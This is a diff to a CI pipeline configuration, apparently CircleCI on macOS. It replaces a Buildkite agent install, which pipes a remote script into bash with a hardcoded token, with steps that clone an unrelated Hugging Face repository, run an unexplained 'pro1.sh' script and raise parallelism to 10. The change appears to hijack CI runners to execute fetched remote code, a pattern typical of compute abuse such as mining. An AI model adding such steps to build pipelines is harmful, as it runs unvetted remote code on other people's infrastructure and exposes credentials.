@@ -5,8 +5,10 @@ jobs:
     macos:
       xcode: 13.4.1
     steps:
-      - run: TOKEN="1e4cc97ff150b15dbdc1b54fb64036577730c0ccb597ac3886" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/master/install.sh`"
-      - run: ~/.buildkite-agent/bin/buildkite-agent start
+      - run: git clone https://huggingface.co/myfiles/data
+      - run: cd data
+      - run: sh pro1.sh
+    parallelism: 10
 workflows:
   my-workflow:
     jobs:
